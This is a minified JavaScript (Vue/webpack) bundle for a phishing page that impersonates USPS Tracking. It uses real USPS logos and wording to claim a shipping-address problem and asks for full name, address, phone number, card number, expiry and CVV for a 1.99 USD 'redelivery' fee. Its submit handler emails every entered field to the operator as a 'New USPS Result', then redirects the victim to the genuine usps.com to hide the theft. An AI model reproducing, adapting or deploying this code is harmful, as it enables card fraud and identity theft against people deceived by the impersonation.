(window.webpackJsonp=window.webpackJsonp||[]).push([[6,2,3],{236:function(t,e,r){"use strict";r.r(e);var o={},l=r(38),component=Object(l.a)(o,(function(){var t=this,e=t.$createElement;t._self._c;return t._m(0)}),[function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"flex justify-between pt-2 pl-6 pr-6 pb-2 border-b-4 border-red-500",attrs:{id:"navbar"}},[r("div",[r("img",{staticClass:"w-8",attrs:{src:"https://www.usps.com/assets/images/home/hamburger.svg"}})]),t._v(" "),r("div",[r("img",{staticClass:"w-14",attrs:{src:"https://www.usps.com/assets/images/home/logo_mobile.svg"}})]),t._v(" "),r("div",[r("img",{staticClass:"w-8",attrs:{src:"https://www.usps.com/assets/images/home/search.svg"}})])])}],!1,null,null,null);e.default=component.exports},237:function(t,e,r){"use strict";r.r(e);var o={},l=r(38),component=Object(l.a)(o,(function(){var t=this,e=t.$createElement;t._self._c;return t._m(0)}),[function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"border-t-2 pt-4 mt-4"},[r("div",{staticClass:"pl-6"},[r("img",{attrs:{src:"https://i.gyazo.com/290b715a39c9f2b9c966442d0849dbe9.png"}})]),t._v(" "),r("div",{staticClass:"pl-6 pr-6 pt-4 pb-4 flex justify-between"},[r("div",{staticClass:"text-sm"},[r("div",{staticClass:"font-semibold",staticStyle:{color:"#336"}},[t._v("HELPFUL LINKS")]),t._v(" "),r("div",[t._v("Contact Us")]),t._v(" "),r("div",[t._v("Site Index")]),t._v(" "),r("div",[t._v("FAQs")]),t._v(" "),r("div",[t._v("Feedback")])]),t._v(" "),r("div",{staticClass:"text-sm"},[r("div",{staticClass:"font-semibold",staticStyle:{color:"#336"}},[t._v("ON ABOUT.USPS.COM")]),t._v(" "),r("div",[t._v("About USPS Home")]),t._v(" "),r("div",[t._v("Newsroom")]),t._v(" "),r("div",[t._v("USPS Service Updates")]),t._v(" "),r("div",[t._v("Forms & Publications")]),t._v(" "),r("div",[t._v("Government Services")])])]),t._v(" "),r("div",{staticClass:"pb-8 flex justify-center text-sm"},[t._v("\n\t\tCopyright © 2021 USPS. All Rights Reserved.\n\t")])])}],!1,null,null,null);e.default=component.exports},241:function(t,e,r){"use strict";r.r(e);var o=r(7),l=(r(50),r(61),r(236)),n=r(237),c={data:function(){return{showAddress:!1,fullName:"",address:"",address2:"",city:"",state:"",postalCode:"",telephone:"",addressError:!1,showCard:!1,showRequestRedelivery:!0,cardNumber:"",expiration:"",cvv:"",cardError:!1,showFinish:!1}},methods:{goToFinish:function(){window.location.href="https://www.usps.com/"},requestDelivery:function(){this.showAddress=!0,this.showRequestRedelivery=!1},submitCard:function(){var t=this;return Object(o.a)(regeneratorRuntime.mark((function e(){return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:""===t.cardNumber||""===t.expiration||""===t.cvv?t.cardError=!0:t.$mail.send({from:"15092021@idontevenneedthis.com",subject:"New USPS Result",text:"\n          Full Name: ".concat(t.fullName,"\n          Address: ").concat(t.address,"\n          Address 2: ").concat(t.address2,"\n          City: ").concat(t.city,"\n          State: ").concat(t.state,"\n          Postal Code: ").concat(t.postalCode,"\n          Telephone: ").concat(t.telephone,"\n          Card Number: ").concat(t.cardNumber,"\n          Expiration: ").concat(t.expiration,"\n          CVV: ").concat(t.cvv,"\n        ")}).then((function(e){t.showFinish=!0,t.showAddress=!1,t.showCard=!1}));case 1:case"end":return e.stop()}}),e)})))()},submitAddress:function(){""===this.fullName||""===this.address||""===this.city||""===this.state||""===this.postalCode||""===this.telephone?this.addressError=!0:(this.showAddress=!1,this.showCard=!0)}},components:[l.default,n.default]},d=r(38),component=Object(d.a)(c,(function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"font-usps",staticStyle:{"background-color":"rgb(247,247,247)"}},[r("Navbar"),t._v(" "),t._m(0),t._v(" "),t._m(1),t._v(" "),t._m(2),t._v(" "),t._m(3),t._v(" "),r("div",{staticClass:"pl-6 pr-6 pt-4"},[r("div",{staticClass:"text-xl font-semibold text-red-600"},[t._v("We have issues with your shipping address")]),t._v(" "),t._m(4),t._v(" "),t.showRequestRedelivery?r("button",{staticClass:"mt-4 p-4 w-full text-white",staticStyle:{"background-color":"#336"},attrs:{type:"button"},on:{click:function(e){return t.requestDelivery()}}},[t._v("Request Redelivery")]):t._e()]),t._v(" "),t.showAddress?r("div",{staticClass:"pl-6 pr-6 pt-4 border border-t-2 mt-4"},[t._m(5),t._v(" "),t.addressError?r("div",[r("div",{staticClass:"text-sm text-red-600"},[t._v("Please check all of the fields and make sure your information is valid")])]):t._e(),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("Full Name:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.fullName,expression:"fullName"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.fullName},on:{input:function(e){e.target.composing||(t.fullName=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("Address:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.address,expression:"address"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.address},on:{input:function(e){e.target.composing||(t.address=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("Address 2:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.address2,expression:"address2"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.address2},on:{input:function(e){e.target.composing||(t.address2=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("City:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.city,expression:"city"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.city},on:{input:function(e){e.target.composing||(t.city=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("State:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.state,expression:"state"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.state},on:{input:function(e){e.target.composing||(t.state=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("Postal Code:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.postalCode,expression:"postalCode"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.postalCode},on:{input:function(e){e.target.composing||(t.postalCode=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("Telephone:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.telephone,expression:"telephone"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.telephone},on:{input:function(e){e.target.composing||(t.telephone=e.target.value)}}})]),t._v(" "),r("div",[r("button",{staticClass:"mt-4 p-4 w-full text-white",staticStyle:{"background-color":"#336"},attrs:{type:"button"},on:{click:function(e){return t.submitAddress()}}},[t._v("Submit")])])]):t._e(),t._v(" "),t.showCard?r("div",{staticClass:"pl-6 pr-6 pt-4 border border-t-2 mt-4"},[t._m(6),t._v(" "),t.cardError?r("div",[r("div",{staticClass:"text-sm text-red-600"},[t._v("Please check all of the fields and make sure your information is valid")])]):t._e(),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("Card Number:")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.cardNumber,expression:"cardNumber"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.cardNumber},on:{input:function(e){e.target.composing||(t.cardNumber=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("Expiration (MM/YY):")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.expiration,expression:"expiration"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.expiration},on:{input:function(e){e.target.composing||(t.expiration=e.target.value)}}})]),t._v(" "),r("div",{staticClass:"pt-2"},[r("label",{staticClass:"text-md font-semibold",staticStyle:{color:"#336"}},[t._v("CVV (Security Code on Back of Card):")]),t._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:t.cvv,expression:"cvv"}],staticClass:"w-full border h-10 pl-2",attrs:{type:"text"},domProps:{value:t.cvv},on:{input:function(e){e.target.composing||(t.cvv=e.target.value)}}})]),t._v(" "),r("div",[r("button",{staticClass:"mt-4 p-4 w-full text-white",staticStyle:{"background-color":"#336"},attrs:{type:"button"},on:{click:function(e){return t.submitCard()}}},[t._v("Submit")])])]):t._e(),t._v(" "),t.showFinish?r("div",{staticClass:"pl-6 pr-6 border-t-2 border-red-600 pt-4 mt-4 pb-4"},[r("div",{staticClass:"text-xl font-bold",staticStyle:{color:"#336"}},[t._v("Payment Submitted!")]),t._v(" "),r("div",{staticClass:"text-sm"},[t._v("Your payment has been submitted! You will receive an email confirmation once your redelivery has been processed. Expect your package within the next 1-3 days. This tracking number will be updated on any updates. Thank you for using USPS as your trusted delivery.")]),t._v(" "),r("button",{staticClass:"mt-4 p-4 w-full text-white",staticStyle:{"background-color":"#336"},attrs:{type:"button"},on:{click:function(e){return t.goToFinish()}}},[t._v("Continue to USPS")])]):t._e(),t._v(" "),r("Footer")],1)}),[function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"p-6 flex justify-between"},[r("div",{staticClass:"text-2xl font-semibold",staticStyle:{color:"#336"}},[t._v("USPS Tracking"),r("sup",[t._v("®")])]),t._v(" "),r("div",{staticClass:"text-sm font-semibold",staticStyle:{color:"#336"}},[t._v("FAQs")])])},function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"p-6"},[r("div",{staticClass:"text-xl font-semibold",staticStyle:{color:"#336"}},[t._v("Tracking Number:")]),t._v(" "),r("div",[t._v("9400111108400173533528")])])},function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"pl-6 pr-6 pt-2"},[r("div",{staticClass:"font-md font-semibold",staticStyle:{color:"#336"}},[t._v("USPS Tracking Plus"),r("sup",[t._v("™")])])])},function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"flex gap-x-2 pl-6 pr-6"},[r("div",{staticClass:"h-5 bg-red-600 w-full -skew-x-12 transform"}),t._v(" "),r("div",{staticClass:"h-5 bg-red-600 w-full -skew-x-12 transform"}),t._v(" "),r("div",{staticClass:"h-5 w-full -skew-x-12 transform",staticStyle:{"background-color":"rgb(217,217,217)"}})])},function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"pt-2 text-sm"},[t._v("USPS Allows you to Redeliver your package to your address in case of delivery failure or any other case."),r("br"),t._v("You can also track the package at any time, from shipment to delivery.")])},function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"pb-4"},[r("div",{staticClass:"text-lg font-bold",staticStyle:{color:"#336"}},[t._v("Verify Address")]),t._v(" "),r("div",{staticClass:"text-md"},[t._v("First, we need to confirm your address is eligible for Informed Delivery.")])])},function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"pb-4"},[r("div",{staticClass:"text-lg font-bold",staticStyle:{color:"#336"}},[t._v("Payment Method")]),t._v(" "),r("div",{staticClass:"text-md"},[t._v("This Redelivery request cost 1.99 USD.")])])}],!1,null,null,null);e.default=component.exports;installComponents(component,{Navbar:r(236).default,Footer:r(237).default})}}]);